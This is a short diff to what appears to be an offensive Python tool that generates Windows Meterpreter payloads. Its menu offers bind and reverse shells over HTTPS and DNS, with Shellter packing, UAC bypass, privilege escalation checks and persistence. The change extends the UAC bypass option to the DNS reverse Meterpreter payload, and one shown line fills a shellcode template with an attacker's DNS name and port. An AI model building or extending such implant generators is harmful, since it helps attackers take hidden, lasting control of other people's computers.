@@ -63,7 +63,7 @@ print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
 print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + '(Staged)' +
        t.bold_red + ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width + 6) + t.normal
 print ('[5] Windows Reverse Meterpreter DNS' + t.bold_green + '(Staged)' +
-       t.bold_red + ' [BETA]').center(t.width + 6) + t.normal
+       t.bold_red + ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width + 4) + t.normal
 print '=' * t.width
 
 try:
@@ -158,7 +158,7 @@ try:
             '\n[*] Please Enter DNS Name Manually\n[*] DNS> ')
         shellcode = payloadchoice % (DNSaddr,porthex)
 
-    if menuchoice == '2' or menuchoice == '3' or menuchoice == '4':
+    if menuchoice == '2' or menuchoice == '3' or menuchoice == '4' or menuchoice == '5':
         want_UACBYPASS = raw_input(
             t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)? y/[n]:' + t.normal)
         if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '':
